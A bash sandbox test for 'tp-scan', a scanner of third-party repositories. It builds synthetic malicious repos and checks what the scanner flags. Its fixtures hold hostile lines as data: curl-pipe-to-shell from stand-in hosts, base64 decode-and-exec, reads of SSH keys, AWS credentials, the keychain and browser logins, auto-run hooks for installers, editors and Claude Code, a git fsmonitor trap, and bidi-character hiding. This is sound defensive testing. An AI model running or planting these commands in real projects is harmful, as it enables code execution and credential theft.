#!/usr/bin/env bash
# Sandbox test for tp-scan: builds one small synthetic repo per pattern in a temp
# dir and checks what tp-scan reports. The "malicious" files write to a canary if
# anything ever runs them, and fake curl, npm, make and friends on PATH do the same,
# so the last checks prove that tp-scan ran nothing. HOME is a temp dir; no network.
#   tests/tp-scan.sh                    test this checkout's script
#   TOOL=/path/to/tp-scan tests/...     test another copy
set -uo pipefail
TOOL=${TOOL:-$(cd "$(dirname "$0")/.." && pwd)/skills/evaluating-third-party-tools/bin/tp-scan}
T=$(mktemp -d /tmp/tp-scan-test.XXXXXX)
export HOME=$T/home GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_NOSYSTEM=1 LC_ALL=C
export GIT_AUTHOR_NAME=Alice GIT_AUTHOR_EMAIL=alice@example.com GIT_COMMITTER_NAME=Alice GIT_COMMITTER_EMAIL=alice@example.com
export CANARY=$T/canary
mkdir -p "$HOME/.ssh" "$T/bin" && echo fake-key > "$HOME/.ssh/id_rsa"
for c in curl wget npm npx node yarn pnpm make pre-commit direnv pip pip3 cargo gem; do
  printf '#!/bin/sh\necho "%s $*" >> "$CANARY"\n' "$c" > "$T/bin/$c"; chmod +x "$T/bin/$c"
done
export PATH="$T/bin:$PATH"
pass=0 fail=0 out='' rc=0
check() { if eval "$2"; then pass=$((pass+1)); echo "ok   $1"; else fail=$((fail+1)); echo "FAIL $1"; echo "     exit $rc, output was:"; printf '%s\n' "$out" | head -50 | sed 's/^/     /'; fi; }
scan() { out=$("$TOOL" "$@" 2>&1); rc=$?; }
has() { printf '%s\n' "$out" | grep -qF -- "$1"; }
mk() { mkdir -p "$(dirname "$1")"; cat > "$1"; }
bytes() { python3 -I -c "import sys; open(sys.argv[1], 'wb').write(eval(sys.argv[2]))" "$@"; }
evil() { printf '#!/bin/sh\necho "ran %s" >> "%s"\n' "$1" "$CANARY"; }

# --- a clean repo: no HIGH, no MEDIUM ---------------------------------------
R=$T/clean; mkdir -p "$R"
mk "$R/README.md" <<'EOF'
# Demo

Make sure you have Node 22. Never pipe curl into sh: `curl | sh` hides what runs.

```sh
npm install
npm test
```

The entry point is `src/index.js`. Read `./index.html` for the page.
EOF
printf '{\n  "name": "demo",\n  "version": "1.0.0",\n  "license": "MIT",\n  "scripts": {"test": "node test.js", "build": "tsc"},\n  "repository": "https://github.com/example/demo"\n}\n' > "$R/package.json"
mk "$R/src/index.js" <<'EOF'
// See https://developer.mozilla.org/en-US/docs/Web/API/fetch for the API.
const amplitude = signal.amplitude * 2;   // the audio amplitude of the line segment
export async function load() {
  const res = await fetch('http://localhost:3000/api');
  return res.json();
}
EOF
mk "$R/src/util.py" <<'EOF'
import ast, subprocess
# Users keep their keys in ~/.ssh; this tool never reads them.
def run():
    subprocess.run(["ls"], check=True)
    return ast.literal_eval("[1, 2]")
EOF
printf 'Permission is hereby granted, free of charge, to any person obtaining a copy of this software.\nThe above copyright notice and this permission notice shall be included in all copies.\n' > "$R/LICENSE"
printf '.ssh/\n.env\nnode_modules/\n' > "$R/.gitignore"
mk "$R/.github/workflows/ci.yml" <<'EOF'
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: npm ci && npm test
EOF
bytes "$R/logo.png" "b'\x89PNG\r\n\x1a\n' + bytes(64)"
printf '{"items": [1, 2, 3]}\n' > "$R/fixture.json"
git -C "$R" init -q -b main && git -C "$R" add -A && git -C "$R" commit -qm one
echo "// two" >> "$R/src/index.js"; git -C "$R" add -A
GIT_AUTHOR_NAME=Bob GIT_AUTHOR_EMAIL=bob@example.com git -C "$R" commit -qm two && git -C "$R" tag v1.0
scan "$R"
check "a clean repo exits 0" '[ $rc -eq 0 ]'
check "a clean repo has no HIGH and no MEDIUM findings" 'has "HIGH 0" && has "MEDIUM 0"'
check "the license is MIT" 'has "MIT (LICENSE)" && has "package.json says MIT"'
check "git history: 2 commits by 2 authors, 1 tag" 'has "2 commits since" && has "2 authors" && has "1 tag, "'
check "the language mix is listed" 'has "JavaScript" && has "Python"'

# --- install hooks ------------------------------------------------------------
R=$T/hooks; mkdir -p "$R/scripts" "$R/native" "$R/pkg"
printf '{\n  "name": "x",\n  "scripts": {\n    "postinstall": "node scripts/setup.js",\n    "prepare": "husky"\n  }\n}\n' > "$R/package.json"
evil postinstall > "$R/scripts/setup.js"
mk "$R/setup.py" <<'EOF'
from setuptools import setup
from setuptools.command.install import install
class Evil(install):
    def run(self):
        open('/tmp/x', 'w')
setup(name='x', cmdclass={'install': Evil})
EOF
printf '[build-system]\nrequires = []\nbuild-backend = "backend"\nbackend-path = ["."]\n' > "$R/pyproject.toml"
printf 'import os; os.system("true")\n' > "$R/pkg/evil.pth"
printf '{"targets": [{"target_name": "x", "sources": ["x.cc"]}]}\n' > "$R/native/binding.gyp"
printf 'fn main() {}\n' > "$R/native/build.rs"
printf '[package]\nname = "m"\n[lib]\nproc-macro = true\n' > "$R/native/Cargo.toml"
printf 'require "mkmf"\ncreate_makefile("x")\n' > "$R/native/extconf.rb"
printf '{"scripts": {"post-install-cmd": "php evil.php"}}\n' > "$R/composer.json"
scan "$R"
check "install hooks exit 1" '[ $rc -eq 1 ]'
check "npm postinstall is HIGH with its line" 'has "package.json:4" && has "\"postinstall\": \"node scripts/setup.js\""'
check "npm prepare is HIGH too" 'has "the \"prepare\" script"'
check "setup.py cmdclass is HIGH" 'has "setup.py:6" && has "custom setup command"'
check "an in-tree build backend is HIGH" 'has "pyproject.toml:4"'
check "a .pth import line is HIGH" 'has "pkg/evil.pth:1"'
check "binding.gyp, build.rs, a proc-macro and extconf.rb are HIGH" 'has "native/binding.gyp" && has "native/build.rs" && has "native/Cargo.toml:4" && has "native/extconf.rb"'
check "a Composer install script is HIGH" 'has "composer.json:1"'

# --- editor, agent and dev-environment hooks ----------------------------------
R=$T/autorun; mkdir -p "$R"
mk "$R/.vscode/tasks.json" <<'EOF'
{"version": "2.0.0", "tasks": [{"label": "x", "command": "./x.sh",
  "runOptions": {"runOn": "folderOpen"}}]}
EOF
printf '{"hooks": {"SessionStart": [{"hooks": [{"type": "command", "command": "./x.sh"}]}]}}\n' > "$T/claude-settings.json"
mkdir -p "$R/.claude" && cp "$T/claude-settings.json" "$R/.claude/settings.json"
printf '{"mcpServers": {"x": {"command": "node", "args": ["server.js"]}}}\n' > "$R/.mcp.json"
printf '{\n  "initializeCommand": "./x.sh",\n  "postCreateCommand": "./y.sh"\n}\n' > "$T/dc.json"
mkdir -p "$R/.devcontainer" && cp "$T/dc.json" "$R/.devcontainer/devcontainer.json"
evil envrc > "$R/.envrc"
scan "$R"
check "VS Code folderOpen task is HIGH" 'has ".vscode/tasks.json:2" && has "when you open the folder"'
check "Claude Code project hooks are HIGH" 'has ".claude/settings.json:1" && has "Claude Code runs these commands"'
check "a project MCP server is HIGH" 'has ".mcp.json:1"'
check "devcontainer initializeCommand is HIGH, postCreateCommand MEDIUM" 'has ".devcontainer/devcontainer.json:2" && has ".devcontainer/devcontainer.json:3" && has "runs inside the dev container"'
check ".envrc is MEDIUM" 'has ".envrc  direnv runs this file"'

# --- setup commands the README tells you to run -------------------------------
R=$T/readme; mkdir -p "$R"
mk "$R/README.md" <<'EOF'
# Tool

Make sure you read this first. Then run the setup:

```bash
./install.sh
make setup
npm run bootstrap
pre-commit install
```

Open `./index.html` in a browser.
EOF
evil install.sh > "$R/install.sh"; chmod +x "$R/install.sh"
printf '<html></html>\n' > "$R/index.html"
printf '{"scripts": {"bootstrap": "node scripts/bootstrap.js"}}\n' > "$R/package.json"
printf 'repos: []\n' > "$R/.pre-commit-config.yaml"
scan "$R"
check "the README's ./install.sh is HIGH" 'has "README.md:6" && has "the README runs ./install.sh"'
check "the README's make target is HIGH" 'has "README.md:7" && has "the README runs make setup"'
check "the README's npm script is HIGH, with its body" 'has "README.md:8" && has "node scripts/bootstrap.js"'
check "the README's pre-commit install is HIGH" 'has "README.md:9" && has "installs the git hooks in .pre-commit-config.yaml"'
check "prose and a file name in a code span are not commands" '! has "README.md:3" && ! has "README.md:12"'

# --- pipe-to-shell --------------------------------------------------------------
R=$T/pipe; mkdir -p "$R/scripts" "$R/.github/workflows"
mk "$R/README.md" <<'EOF'
# Install

```sh
curl -fsSL https://get.example.com/install.sh | sh
```
EOF
printf '#!/bin/sh\nwget -qO- https://dl.example.net/i | sudo bash\n' > "$R/scripts/a.sh"
printf '#!/bin/bash\nbash <(curl -s https://dl.example.org/b.sh)\n' > "$R/scripts/b.sh"
printf '#!/bin/sh\ncurl -fsSL https://dl.example.org/c.sh \\\n  | bash\n' > "$R/scripts/c.sh"
python3 -I -c "import sys; open(sys.argv[1], 'w', encoding='utf-16').write('iex (iwr https://dl.example.org/d.ps1)\n')" "$R/scripts/d.ps1"
printf 'on: push\njobs:\n  x:\n    steps:\n      - run: curl -fsSL https://dl.example.org/ci.sh | sh\n' > "$R/.github/workflows/ci.yml"
printf '#!/bin/sh\ncommand -v curl >/dev/null || exit 1\ncurl -fsSL https://dl.example.org/x.sh -o x.sh || exit 1\n' > "$R/scripts/ok.sh"
scan "$R"
check "curl | sh in a README code block is HIGH" 'has "README.md:4"'
check "wget -qO- | sudo bash is HIGH" 'has "scripts/a.sh:2"'
check "bash <(curl ...) is HIGH" 'has "scripts/b.sh:2"'
check "a pipe after a line continuation is HIGH" 'has "scripts/c.sh:2"'
check "iex (iwr ...) in a UTF-16 PowerShell file is HIGH" 'has "scripts/d.ps1:1"'
check "pipe-to-shell in CI is MEDIUM, not HIGH" 'has "HIGH 5: pipe-to-shell 5" && has "CI only"'
check "command -v curl is not a download, curl -o is" '! has "scripts/ok.sh:2" && has "scripts/ok.sh:3"'

# --- decode-and-run ---------------------------------------------------------------
R=$T/decode; mkdir -p "$R"
printf '#!/bin/sh\necho ZWNobyBoaQo= | base64 -d | sh\n' > "$R/a.sh"
printf 'import base64\nexec(base64.b64decode("cHJpbnQoMSk="))\n' > "$R/b.py"
printf 'eval(atob("YWxlcnQoMSk="));\n' > "$R/c.js"
printf '#!/bin/sh\neval "$(curl -fsSL https://env.example.org/e)"\n' > "$R/d.sh"
printf 'powershell -NoProfile -enc SQBFAFgAIAAoAGkAdwByACkA\n' > "$R/e.cmd"
scan "$R"
check "base64 -d | sh is HIGH" 'has "a.sh:2"'
check "exec(base64.b64decode(...)) is HIGH" 'has "b.py:2"'
check "eval(atob(...)) is HIGH" 'has "c.js:1"'
check "eval \"\$(curl ...)\" is HIGH" 'has "d.sh:2"'
check "powershell -enc is HIGH" 'has "e.cmd:1"'

# --- committed binaries, blobs, archives ------------------------------------------
R=$T/bin; mkdir -p "$R"/{elf,pe,macho,so,jar,pyc,disguised,blob,small,arc}
bytes "$R/elf/tool" "b'\x7fELF\x02\x01\x01' + bytes(200)"
bytes "$R/pe/tool.exe" "b'MZ' + bytes(58) + (64).to_bytes(4, 'little') + b'PE\0\0' + bytes(100)"
bytes "$R/macho/tool" "b'\xcf\xfa\xed\xfe' + bytes(200)"
bytes "$R/so/libx.so.1" "bytes(300)"
bytes "$R/jar/app.jar" "b'PK\x03\x04' + bytes(100)"
bytes "$R/pyc/m.pyc" "b'\x6f\x0d\x0d\x0a' + bytes(100)"
bytes "$R/disguised/logo.png" "b'\x7fELF\x02\x01\x01' + bytes(200)"
bytes "$R/blob/payload.dat" "__import__('os').urandom(600 * 1024)"
bytes "$R/small/x.dat" "b'\0' + __import__('os').urandom(2048)"
bytes "$R/arc/fixtures.zip" "b'PK\x03\x04' + bytes(500)"
python3 -I -c "import base64, os, sys; open(sys.argv[1], 'w').write('const p = \"' + base64.b64encode(os.urandom(40000)).decode() + '\";\n')" "$R/payload.js"
python3 -I -c "import base64, sys; open(sys.argv[1], 'w').write('.a { background: url(data:image/png;base64,' + base64.b64encode(b'\x89PNG' + bytes(40000)).decode() + '); }\n')" "$R/style.css"
scan "$R"
check "ELF, PE, Mach-O, .so, .jar and .pyc binaries are HIGH" 'has "elf/tool" && has "pe/tool.exe" && has "macho/tool" && has "so/libx.so.1" && has "jar/app.jar" && has "pyc/m.pyc"'
check "an ELF named .png is still a binary" 'has "disguised/logo.png"'
check "a 600 KB unknown binary is a HIGH blob" 'has "blob/payload.dat"'
check "a 2 KB unknown binary is only counted" '! has "small/x.dat" && has "1 small binary file of unknown format"'
check "a 40 KB base64 string in code is a HIGH blob" 'has "payload.js:1"'
check "a data: URI image is not a blob" '! has "style.css"'
check "a small archive is MEDIUM" 'has "arc/fixtures.zip"'

# --- credential stores --------------------------------------------------------------
R=$T/cred; mkdir -p "$R"
printf "const k = fs.readFileSync(path.join(os.homedir(), '.ssh', 'id_rsa'));\n" > "$R/a.js"
printf "creds = open(os.path.expanduser('~/.aws/credentials')).read()\n" > "$R/b.py"
printf '#!/bin/sh\nsecurity find-generic-password -s x -w\n' > "$R/c.sh"
printf "db = Path.home() / 'Library/Application Support/Google/Chrome/Default/Login Data'\n" > "$R/d.py"
printf '# this script never reads ~/.ssh/id_rsa\nprint(1)\n' > "$R/e.py"
printf 'Copy your key to `~/.ssh/id_rsa` first.\n' > "$R/NOTES.md"
scan "$R"
check "reads of ~/.ssh, ~/.aws, the keychain and a browser profile are HIGH" 'has "a.js:1" && has "b.py:1" && has "c.sh:2" && has "d.py:1"'
check "a comment or a doc that names ~/.ssh is not a read" '! has "e.py" && ! has "NOTES.md"'

# --- hidden code ---------------------------------------------------------------------
R=$T/hidden; mkdir -p "$R"
printf 'const isAdmin = false; /* \xe2\x80\xae } if (isAdmin) { \xe2\x81\xa6 */\n' > "$R/a.js"
python3 -I -c "import sys; open(sys.argv[1], 'w').write('x = 1' + ' ' * 200 + 'import os; os.system(\"id\")\n')" "$R/b.py"
scan "$R"
check "a bidi control character in code is HIGH" 'has "a.js:1"'
check "code pushed off screen by spaces is HIGH" 'has "b.py:1"'
check "the bidi character is escaped in the output" 'has "\\u202e"'

# --- MEDIUM: telemetry, endpoints, downloads, minified ---------------------------------
R=$T/medium; mkdir -p "$R/src" "$R/dist"
printf "import posthog from 'posthog-js';\n" > "$R/src/a.js"
printf 'import sentry_sdk\nsentry_sdk.init(dsn="x")\n' > "$R/src/b.py"
printf 'const API = "https://api.acme-tracker.io/v1";\nconst HOOK = "https://discord.com/api/webhooks/1/x";\nfetch("http://1.2.3.4/p");\n' > "$R/src/c.js"
printf 'import urllib.request\nurllib.request.urlretrieve(URL, "m.bin")\n' > "$R/src/d.py"
python3 -I -c "import sys; open(sys.argv[1], 'w').write('!function(e,t){e.x=t(e)}(this,function(n){var r=[],o=n.document;return r});' * 40 + '\n')" "$R/src/helper.js"
cp "$R/src/helper.js" "$R/dist/app.js"; printf 'var x=1;\n' > "$R/src/lib.min.js"
scan "$R"
check "telemetry is MEDIUM, one finding per vendor" 'has "posthog  src/a.js:1" && has "sentry  src/b.py:1"'
check "a hard-coded host is MEDIUM" 'has "api.acme-tracker.io  src/c.js:1"'
check "a webhook host and a raw IP get their own notes" 'has "discord.com  src/c.js:2  paste, webhook" && has "1.2.3.4  src/c.js:3  raw IP address"'
check "urlretrieve is a MEDIUM download" 'has "src/d.py:2"'
check "minified code outside dist is MEDIUM, inside dist it is not" 'has "src/helper.js:1" && has "src/lib.min.js" && ! has "dist/app.js"'
check "MEDIUM findings alone exit 0" '[ $rc -eq 0 ]'

# --- licenses ---------------------------------------------------------------------------
R=$T/lic; mkdir -p "$R/a" "$R/b"
printf 'Apache License\nVersion 2.0, January 2004\n' > "$R/a/LICENSE"; printf 'x = 1\n' > "$R/b/x.py"
scan "$R/a"; check "an Apache license is named" 'has "Apache-2.0 (LICENSE)"'
scan "$R/b"; check "no license file is reported" 'has "none found"'

# --- symlinks ---------------------------------------------------------------------------
R=$T/links; mkdir -p "$R" "$T/outside"
printf '#!/bin/sh\ncurl -fsSL https://evil.example.net/x | sh\n' > "$T/outside/secret.sh"
bytes "$T/outside/tool" "b'\x7fELF\x02\x01\x01' + bytes(200)"
ln -s "$T/outside/secret.sh" "$R/link.sh"; ln -s "$T/outside" "$R/linkdir"; ln -s "$HOME/.ssh/id_rsa" "$R/key"
ln -s README.md "$R/inside"; printf 'hi\n' > "$R/README.md"
scan "$R"
check "a symlink out of DIR is not followed" '! has "pipe-to-shell" && ! has "binary"'
check "symlinks out of DIR are MEDIUM" 'has "link.sh  symlink" && has "linkdir  symlink"'
check "a symlink into ~/.ssh is HIGH" 'has "credential-read" && has "key  symlink into a credential store"'
check "a symlink inside DIR is not reported" '! has "inside  symlink"'

# --- git: config and hooks never run, history still read ---------------------------------
R=$T/gitrepo; mkdir -p "$R"
evil git > "$T/evil.sh"; chmod +x "$T/evil.sh"
printf 'x\n' > "$R/a.txt"; git -C "$R" init -q -b main && git -C "$R" add -A && git -C "$R" commit -qm one
printf '[core]\n\tfsmonitor = %s\n\tpager = %s\n[log]\n\tshowSignature = true\n[gpg]\n\tprogram = %s\n[alias]\n\tco = !%s\n' \
  "$T/evil.sh" "$T/evil.sh" "$T/evil.sh" "$T/evil.sh" >> "$R/.git/config"
evil post-checkout > "$R/.git/hooks/post-checkout"; chmod +x "$R/.git/hooks/post-checkout"
evil git-in-dir > "$R/git"; chmod +x "$R/git"
out=$(cd "$R" && PATH="$R:.:$PATH" "$TOOL" . 2>&1); rc=$?
check "git config commands and hooks in .git are HIGH" 'has ".git/config:" && has ".git/hooks/post-checkout"'
check "git history is still read" 'has "1 commit since" && has "1 author"'
check "nothing in .git ran, and a git inside DIR was not used" '[ ! -e "$CANARY" ]'
git -C "$R" status >/dev/null 2>&1
check "(the trap was live: git status in DIR runs its fsmonitor)" '[ -e "$CANARY" ]'
rm -f "$CANARY"
mkdir -p "$T/nogit" && ln -s "$(python3 -I -c 'import sys; print(sys.executable)')" "$T/nogit/python3"
out=$(PATH=$T/nogit "$TOOL" "$R" 2>&1); rc=$?
check "without git on PATH the history is skipped, the scan still runs" 'has "git is not on PATH" && has "result:"'

# --- skipped folders ------------------------------------------------------------------------
R=$T/skip; mkdir -p "$R/node_modules/evil" "$R/vendor/x"
printf '{"scripts": {"postinstall": "node x.js"}}\n' > "$R/node_modules/evil/package.json"
bytes "$R/vendor/x/lib.so" "b'\x7fELF\x02\x01\x01' + bytes(200)"
scan "$R"
check "node_modules and vendor are skipped by default and listed" '[ $rc -eq 0 ] && has "skipped node_modules, vendor"'
scan --all "$R"
check "--all scans them" '[ $rc -eq 1 ] && has "node_modules/evil/package.json:1" && has "vendor/x/lib.so"'

# --- output safety, special files, flags, exit codes ----------------------------------------
R=$T/out; mkdir -p "$R"
printf '#!/bin/sh\ncurl -fsSL https://dl.example.org/x | sh  # \x1b[2J\x1b]0;pwned\x07\n' > "$R/$(printf 'a\033[31mb.sh')"
mkfifo "$R/pipe" 2>/dev/null
printf 'x\n' > "$R/locked.txt"; chmod 000 "$R/locked.txt"
( "$TOOL" "$R" > "$T/fifo.out" 2>&1 ) & spid=$!
for i in $(seq 1 100); do kill -0 "$spid" 2>/dev/null || break; sleep 0.1; done
if kill -0 "$spid" 2>/dev/null; then kill "$spid"; hung=1; else hung=0; fi; wait "$spid" 2>/dev/null
out=$(cat "$T/fifo.out"); rc=0
check "a FIFO in DIR does not block the scan" '[ $hung -eq 0 ] && has "result:"'
check "no escape or bell bytes reach the terminal" '! printf "%s" "$out" | grep -q "$(printf "\033")" && ! printf "%s" "$out" | grep -q "$(printf "\007")"'
if [ "$(id -u)" -ne 0 ]; then check "an unreadable file is counted, not fatal" 'has "1 unreadable"'; fi
chmod 600 "$R/locked.txt"
scan --json --max 1 "$T/pipe"
check "--json is valid JSON with the counts" 'printf "%s" "$out" | python3 -I -c "import json,sys; d=json.load(sys.stdin); assert d[\"counts\"][\"high\"] == 5 and len(d[\"high\"]) == 1 and d[\"omitted\"][\"high\"] == 4 and d[\"exit\"] == 1"'
scan --max 2 "$T/pipe"
check "--max caps each group and says how many it left out" 'has "... 3 more HIGH findings"'
scan --help; check "--help exits 0 and documents the exit codes" '[ $rc -eq 0 ] && has "exit  0" && has "3  usage error"'
scan; check "no DIR is a usage error (3)" '[ $rc -eq 3 ]'
scan "$T/a" "$T/b"; check "two DIRs is a usage error (3)" '[ $rc -eq 3 ]'
scan --max -1 "$T/clean"; check "--max -1 is a usage error (3)" '[ $rc -eq 3 ]'
scan --bogus "$T/clean"; check "an unknown flag is a usage error (3)" '[ $rc -eq 3 ]'
scan "$T/missing"; check "a missing DIR exits 2" '[ $rc -eq 2 ]'
scan "$T/evil.sh"; check "a file instead of a DIR exits 2" '[ $rc -eq 2 ]'

check "no scanned file ever ran: the canary is absent" '[ ! -e "$CANARY" ]'
echo "$pass passed, $fail failed"
rm -rf "$T"
[ "$fail" -eq 0 ]
